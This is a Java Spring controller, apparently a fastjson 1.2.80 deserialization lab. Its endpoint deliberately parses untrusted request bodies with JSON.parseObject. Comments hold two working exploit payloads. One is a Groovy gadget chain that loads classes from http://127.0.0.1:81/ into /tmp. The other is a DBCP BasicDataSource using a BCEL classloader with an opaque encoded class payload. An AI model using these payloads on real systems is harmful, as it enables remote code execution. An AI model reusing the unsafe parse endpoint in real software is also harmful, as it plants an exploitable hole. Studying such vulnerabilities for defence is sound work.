package me.mole.controller;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import org.springframework.web.bind.annotation.*;

@RestController
@RequestMapping("/fj1280")
public class FastjsonController {

    @GetMapping("/hello")
    public String hello() {
        return "Hello, SpringBoot!";
    }

    /*
    step 1:
    {
      "@type":"java.lang.Exception",
      "@type":"org.codehaus.groovy.control.CompilationFailedException",
      "unit":{}
    }

    step 2:
    {
      "@type":"org.codehaus.groovy.control.ProcessingUnit",
      "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
      "config":{
        "@type": "org.codehaus.groovy.control.CompilerConfiguration",
        "classpathList":"http://127.0.0.1:81/"
      },
      "gcl":null,
      "destDir": "/tmp"
    }

     */
    @PostMapping(value = "/hackfastjson1")
    public String hackfastjson1(@RequestBody String jsonStr) {
        System.out.println("s===" + jsonStr);
        JSONObject jsonObject = JSON.parseObject(jsonStr);
        return "ok";
    }


    /**
     * String poc3 = "\n" +
     * "    {\n" +
     * "        \"aaa\": {\n" +
     * "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
     * "                \"driverClassLoader\": {\n" +
     * "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
     * "                },\n" +
     * "                \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$c9N$c30$Q$7dn$d3$s$N$v$85B$d9$97$b2$X$q$a8$84$b8$81$b8$m$b8$Q$WQ$Eg$d7X$c5$Q$92$uu$R$7f$c4$99$L$m$O$7c$A$l$85$Y$87$5d$Q$v3$997$ef$3d$cf$c4$_$afO$cf$A$d60$ef$c2$c1$a0$8b$n$M$3b$Y1y$d4$c6$98$8b$i$c6mL$d8$98d$c8o$a8P$e9M$86lm$f1$84$c1$da$8a$ce$qC$c9W$a1$dc$ef$5c5er$cc$9b$B$ne$3f$S$3c8$e1$892$f5$Hh$e9s$d56ly$ad$82$fa$f6M$iDJ$af$ae38$h$o$f8$f0e$c4$ab$f8$X$fc$9a$d7$D$k$b6$88$rd$acU$U$S$ad$d8$d0$5c$5c$ee$f18$f5$a3$d1$Y$dcF$d4I$84$dcQ$c6$bf$f8i$b9b$f4$k$KpmT$3dLa$9a$s$8ab$ZV$97yu$8b$H$a2$Tp$j$r$kf0$cb$d0$f7$cfi$k$e6$e0$92$e3$afI$Zz$be$a9$H$cd$L$v4C$ef7t$d4$J$b5$ba$a2A$dc$96$d4_E$a5$b6$e8$ff$e1$d06$96$bc$91$82a$a1$f6$a3$db$d0$89$K$5b$eb$3f$F$87I$qd$bbM$82RLM$9d$fe$83$e3$84$LI$7b$d9ta$e6$c9$80$99m$vvQU$a7$cc$u$e7$96$k$c0$ee$d2$b6G1$9f$82Y$U$vz$ef$Et$a3D$d9A$cf$97$98$a7f$40$f9$R$99r$f6$k$d6$e9$z$9c$dd$a5$7b$e4$efR$bc$40$da$i$b9$Y$c7$B$fa2$be$85$U$b5$c9$d9A$_9$7d$9eP$84Eu$99$aa$3ezmd$7c$h$fd$W5$w$e9P$Do$F$9dw$Zz$C$A$A\"\n" +
     * "        }\n" +
     * "    }: \"bbb\"\n" +
     * "}";
     */

}